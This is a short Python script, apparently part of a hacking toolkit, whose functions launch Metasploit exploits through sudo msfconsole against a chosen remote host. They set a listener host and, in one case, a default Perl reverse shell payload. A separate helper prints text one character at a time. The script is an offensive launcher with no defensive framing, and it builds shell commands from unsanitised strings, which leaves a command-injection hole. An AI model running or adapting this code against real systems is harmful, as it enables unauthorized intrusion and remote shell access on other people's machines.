import sys
import os
import time

def metasploit(exploit:str, rhost:str, lhost:str):
    return os.system(f'sudo msfconsole -q -x "use {exploit}; set rhosts {rhost}; set lhost {lhost};run"')

def ftp(exploit:str, rhosts:str):
    return os.system(f'sudo msfconsole -q -x "use {exploit}; set rhosts {rhosts};run"')

def other(exploit:str, rhost:str, lhost:str, payload:str="payload/cmd/unix/reverse_perl"):
    return os.system(f'sudo msfconsole -q -x "use {exploit}; set rhosts {rhost}; set lhost {lhost}; set payload {payload};run"')

def igel(exploit:str, rhost:str, lhost:str, srvhost:str):
    return os.system(f'sudo msfconsole -q -x "use {exploit}; set rhosts {rhost}; set lhost {lhost};set srvhost {srvhost};run"')

def sprint(text:str):
    print("\033[1;37m")
    for i in str(text) + '\n':
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.1)

